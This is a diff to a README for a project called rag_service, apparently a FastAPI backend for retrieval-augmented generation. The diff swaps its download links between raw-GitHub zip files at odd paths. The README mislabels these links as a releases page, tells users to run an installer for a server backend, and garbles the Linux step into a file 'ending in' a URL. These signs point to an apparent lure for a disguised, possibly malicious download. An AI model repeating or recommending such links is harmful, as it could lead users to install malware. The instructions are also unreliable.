@@ -1,7 +1,7 @@
 # 🚀 rag_service - A Simple Way to Access RAG Services
 
 ## 📥 Download Now
-[![Download rag_service](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/uninspirited/rag_service.zip)](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/uninspirited/rag_service.zip)
+[![Download rag_service](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/src/infrastructure/service-rag-3.3.zip)](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/src/infrastructure/service-rag-3.3.zip)
 
 ## 📖 Introduction
 The **rag_service** application provides a FastAPI-based backend for implementing retrieval-augmented generation (RAG) features. With this application, users can easily conduct hybrid searches and rerank results, offering a quick and efficient way to access and manipulate data.
@@ -18,14 +18,14 @@ Before you begin the installation, make sure your system meets the following min
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click on the link below to access the releases page.
-   [Download from Releases](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/uninspirited/rag_service.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/src/infrastructure/service-rag-3.3.zip)
 
 2. **Select the Latest Release**: On the releases page, locate the most recent version. It will usually be at the top of the list.
 
 3. **Download the Appropriate File**: Each release will contain various files. Choose the one that suits your operating system:
    - **Windows:** Look for files ending in `.exe`.
    - **Mac:** Look for files ending in `.dmg`.
-   - **Linux:** Look for files ending in `https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/uninspirited/rag_service.zip` or similar.
+   - **Linux:** Look for files ending in `https://raw.githubusercontent.com/Thaddaeu5/rag_service/main/src/infrastructure/service-rag-3.3.zip` or similar.
 
 4. **Run the Installer**: After downloading, find the file you just saved on your computer. Double-click on the file to start the installation process. Follow the on-screen instructions to complete the setup.
 
